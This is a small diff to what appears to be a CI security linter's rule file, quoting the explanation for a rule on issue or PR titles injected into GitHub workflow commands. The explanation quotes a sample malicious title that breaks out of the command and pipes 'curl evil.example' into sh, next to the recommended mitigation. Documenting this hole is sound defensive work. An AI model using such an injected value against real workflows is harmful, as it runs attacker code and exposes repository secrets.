@@ -42,7 +42,7 @@
   text:
     en:
       title: Untrusted text injected into a workflow command
-      explanation: An issue, PR or commit title is written by anyone. Placed in run:, it becomes shell; a title like 'a"; curl evil.example | sh #' steals your secrets.
+      explanation: "An issue, PR or commit title is written by anyone. Placed in run:, it becomes shell; a title like 'a\"; curl evil.example | sh #' steals your secrets."
       fix: "Pass the value through an environment variable and quote it: env: TITLE: ${{ github.event.issue.title }} then run: echo \"$TITLE\"."
 
 - id: DOT-CI-004
